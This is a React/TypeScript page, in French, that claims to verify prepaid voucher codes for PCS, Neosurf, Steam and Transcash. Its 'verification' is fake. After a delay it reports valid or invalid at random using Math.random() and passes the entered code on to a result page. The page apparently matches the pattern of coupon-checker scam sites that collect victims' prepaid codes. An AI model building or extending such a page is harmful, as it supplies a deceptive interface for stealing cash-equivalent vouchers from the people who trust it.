import React, { useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ArrowLeft } from 'lucide-react';
import { ButtonLoader } from '../components/Loader';

const providers = {
  pcs: {
    name: 'PCS',
    logo: 'https://upload.wikimedia.org/wikipedia/fr/0/09/PCS_Mastercard_logo.png',
    maxLength: 16,
    pattern: '[0-9]*',
    format: 'XXXX XXXX XXXX XXXX'
  },
  neosurf: {
    name: 'Neosurf',
    logo: 'https://upload.wikimedia.org/wikipedia/commons/7/7e/Neosurf_logo.png',
    maxLength: 10,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXX'
  },
  steam: {
    name: 'Steam',
    logo: 'https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg',
    maxLength: 15,
    pattern: '[A-Z0-9]*',
    format: 'XXXXX-XXXXX-XXXXX'
  },
  transcash: {
    name: 'Transcash',
    logo: 'https://upload.wikimedia.org/wikipedia/fr/5/51/Transcash_logo.png',
    maxLength: 14,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXXXXXX'
  }
};

function VerificationPage() {
  const { provider } = useParams();
  const navigate = useNavigate();
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  if (!provider || !providers[provider.toLowerCase()]) {
    return <div>Provider not found</div>;
  }

  const currentProvider = providers[provider.toLowerCase()];

  const formatCode = (input: string) => {
    let formatted = input.replace(/[^0-9A-Z]/g, '');
    if (currentProvider.name === 'Steam') {
      formatted = formatted.replace(/(.{5})/g, '$1-').slice(0, 17);
    } else if (currentProvider.name === 'PCS') {
      formatted = formatted.replace(/(.{4})/g, '$1 ').slice(0, 19);
    }
    return formatted;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    if (code.length < currentProvider.maxLength) {
      setError('Veuillez entrer un code valide');
      return;
    }

    setLoading(true);
    // Simulate API call
    setTimeout(() => {
      setLoading(false);
      // Navigate to result page with state
      navigate('/result', {
        state: {
          success: Math.random() > 0.5, // Simulate random success/failure
          message: Math.random() > 0.5 
            ? "Votre coupon est valide et peut être utilisé."
            : "Ce coupon est invalide ou a déjà été utilisé.",
          code: code,
          provider: currentProvider.name
        }
      });
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white border-b border-gray-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center">
          <button
            onClick={() => navigate('/')}
            className="flex items-center text-gray-600 hover:text-gray-900"
          >
            <ArrowLeft className="w-5 h-5 mr-2" />
            Retour
          </button>
        </div>
      </header>

      <div className="max-w-lg mx-auto px-4 py-8 sm:px-6 lg:px-8">
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-8">
          {/* Provider Logo */}
          <div className="flex justify-center mb-8">
            <img
              src={currentProvider.logo}
              alt={`Logo ${currentProvider.name}`}
              className="h-16 object-contain"
            />
          </div>

          <h1 className="text-2xl font-bold text-gray-900 text-center mb-2">
            Vérifier votre {currentProvider.name}
          </h1>
          
          <p className="text-gray-600 text-center mb-8">
            Entrez le code de votre coupon {currentProvider.name} pour vérifier sa validité
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label htmlFor="code" className="block text-sm font-medium text-gray-700 mb-1">
                Code {currentProvider.name}
              </label>
              <div className="relative">
                <input
                  type="text"
                  id="code"
                  value={code}
                  onChange={(e) => {
                    const formatted = formatCode(e.target.value.toUpperCase());
                    if (formatted.length <= currentProvider.maxLength + 4) {
                      setCode(formatted);
                    }
                  }}
                  className={`block w-full px-4 py-3 rounded-lg border ${
                    error ? 'border-red-300' : 'border-gray-300'
                  } focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent
                  text-lg tracking-wider font-mono`}
                  placeholder={currentProvider.format}
                  maxLength={currentProvider.maxLength + 4}
                  pattern={currentProvider.pattern}
                />
                <div className="absolute inset-y-0 right-0 flex items-center pr-3">
                  <span className="text-gray-400 text-sm">
                    {code.length}/{currentProvider.maxLength}
                  </span>
                </div>
              </div>
              {error && (
                <p className="mt-2 text-sm text-red-600">
                  {error}
                </p>
              )}
            </div>

            <button
              type="submit"
              disabled={loading || code.length < currentProvider.maxLength}
              className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-lg
                text-white font-medium ${
                  loading || code.length < currentProvider.maxLength
                    ? 'bg-blue-400 cursor-not-allowed'
                    : 'bg-blue-600 hover:bg-blue-700'
                } focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500
                transition-colors duration-200`}
            >
              {loading ? <ButtonLoader /> : 'Vérifier maintenant'}
            </button>
          </form>

          <div className="mt-8 pt-6 border-t border-gray-100">
            <h3 className="text-sm font-semibold text-gray-900 mb-4">
              Instructions :
            </h3>
            <ul className="text-sm text-gray-600 space-y-2">
              <li>• Entrez le code sans espaces ni tirets</li>
              <li>• Vérifiez que tous les chiffres sont corrects</li>
              <li>• Le code doit contenir exactement {currentProvider.maxLength} caractères</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}

export default VerificationPage;